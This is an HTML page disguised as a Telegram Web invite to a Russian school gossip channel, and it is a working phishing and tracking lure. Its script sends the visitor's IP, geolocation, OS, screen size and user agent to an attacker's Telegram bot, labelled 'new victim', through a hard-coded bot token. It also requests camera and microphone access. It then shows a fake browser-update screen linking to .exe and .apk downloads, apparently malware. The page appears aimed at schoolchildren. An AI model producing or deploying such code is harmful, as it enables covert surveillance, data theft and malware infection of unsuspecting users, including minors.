<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        body { background: linear-gradient(135deg, #1e93d6, #0d73bb); min-height: 100vh; margin: 0; display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif; }
        .card { background: white; border-radius: 20px; padding: 40px 30px; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .avatar { width: 100px; height: 100px; background: linear-gradient(135deg, #34b7f1, #2aabee); border-radius: 50%; margin: 0 auto 25px; }
        .title { font-size: 24px; font-weight: bold; color: #000; margin-bottom: 8px; }
        .btn { background: #2aabee; color: white; border: none; border-radius: 14px; padding: 18px; font-size: 17px; width: 100%; cursor: pointer; margin: 20px 0; transition: background 0.3s; }
        .btn:hover { background: #229ed9; }
        .update-screen { display: none; }
        .warning { color: #d93025; font-size: 26px; font-weight: bold; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="card" id="main">
        <div class="avatar"></div>
        <h1 class="title">–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</h1>
        <p style="color:#707579;">56 –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</p>
        <button class="btn" onclick="collectData()">–ü–ï–†–ï–ô–¢–ò –í –ö–ê–ù–ê–õ</button>
        <p style="color:#707579; font-size:14px;">–û—Ç–∫—Ä–æ–µ—Ç—Å—è –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ Telegram</p>
    </div>
    
    <div class="card" id="update" style="display:none;">
        <div style="font-size:60px; margin:20px 0;">‚ö†Ô∏è</div>
        <h2 class="warning">–û–ë–ù–û–í–õ–ï–ù–ò–ï –¢–†–ï–ë–£–ï–¢–°–Ø</h2>
        <p>–í–∞—à –±—Ä–∞—É–∑–µ—Ä —É—Å—Ç–∞—Ä–µ–ª. –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–Ω–∞–ª—É –Ω—É–∂–Ω–∞ –Ω–æ–≤–∞—è –≤–µ—Ä—Å–∏—è.</p>
        <div id="downloadSection" style="margin:30px 0;"></div>
    </div>

<script>
// === –ö–û–ù–§–ò–ì ===
const BOT_TOKEN = '8337372161:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
const CHAT_ID = '8001083987';

// === –û–¢–ü–†–ê–í–ö–ê –í TELEGRAM ===
function sendToTelegram(message) {
    const encodedMessage = encodeURIComponent(message);
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
    
    // –û—Å–Ω–æ–≤–Ω–æ–π —Å–ø–æ—Å–æ–±
    fetch(url)
        .then(response => console.log('‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram'))
        .catch(error => console.log('‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error));
    
    // –†–µ–∑–µ—Ä–≤–Ω—ã–π —Å–ø–æ—Å–æ–± (—á–µ—Ä–µ–∑ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ)
    const img = new Image();
    img.src = url;
}

// === –ü–û–õ–£–ß–ï–ù–ò–ï IP –ò –ì–ï–û ===
async function getIPandGeo() {
    try {
        // –ü–æ–ª—É—á–∞–µ–º IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;
        
        // –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoData = await geoResponse.json();
        
        return {
            ip: ip,
            city: geoData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
            country: geoData.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
            provider: geoData.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
            region: geoData.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
        };
    } catch (error) {
        return {
            ip: '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å',
            city: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
            country: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
            provider: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
            region: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
        };
    }
}

// === –û–ü–†–ï–î–ï–õ–ï–ù–ò–ï –û–° ===
function detectOS() {
    const ua = navigator.userAgent;
    if (/Win/i.test(ua)) return 'Windows';
    if (/Android/i.test(ua)) return 'Android';
    if (/iPhone|iPad/i.test(ua)) return 'iOS';
    if (/Mac/i.test(ua)) return 'macOS';
    return 'Unknown';
}

// === –û–°–ù–û–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø ===
async function collectData() {
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —ç–∫—Ä–∞–Ω –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
    document.getElementById('main').style.display = 'none';
    document.getElementById('update').style.display = 'block';
    
    // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ
    const os = detectOS();
    const geo = await getIPandGeo();
    
    // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
    const message = `üïµÔ∏è –ù–û–í–ê–Ø –ñ–ï–†–¢–í–ê
–í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
–û–°: ${os}
IP: ${geo.ip}
–ì–æ—Ä–æ–¥: ${geo.city}
–°—Ç—Ä–∞–Ω–∞: ${geo.country}
–†–µ–≥–∏–æ–Ω: ${geo.region}
–ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${geo.provider}
–≠–∫—Ä–∞–Ω: ${screen.width}x${screen.height}
User-Agent: ${navigator.userAgent.substring(0, 100)}...`;
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
    sendToTelegram(message);
    
    // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –º–µ–¥–∏–∞
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                stream.getTracks().forEach(track => track.stop());
                sendToTelegram('‚úÖ –î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω—É –ø–æ–ª—É—á–µ–Ω');
            })
            .catch(error => {
                sendToTelegram('‚ùå –î–æ—Å—Ç—É–ø –∫ –º–µ–¥–∏–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω: ' + error.message);
            });
    }
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
    let downloadHTML = '';
    if (os === 'Windows') {
        downloadHTML = '<button class="btn" onclick="window.open(\'https://school4love.github.io/sc/browser_update.exe\')" style="background:#d93025;">‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å –¥–ª—è Windows</button>';
    } else if (os === 'Android') {
        downloadHTML = '<button class="btn" onclick="window.open(\'https://school4love.github.io/sc/browser_update.apk\')" style="background:#d93025;">‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å –¥–ª—è Android</button>';
    } else {
        downloadHTML = '<p style="color:#d93025;">–î–ª—è –≤–∞—à–µ–π —Å–∏—Å—Ç–µ–º—ã –æ–±–Ω–æ–≤–∏—Ç–µ —á–µ—Ä–µ–∑ App Store</p>';
    }
    
    document.getElementById('downloadSection').innerHTML = downloadHTML;
}

// –ê–≤—Ç–æ–æ—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
window.onload = function() {
    const loadMessage = `üì± –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞: ${window.location.href}`;
    sendToTelegram(loadMessage);
};
</script>
</body>
</html>
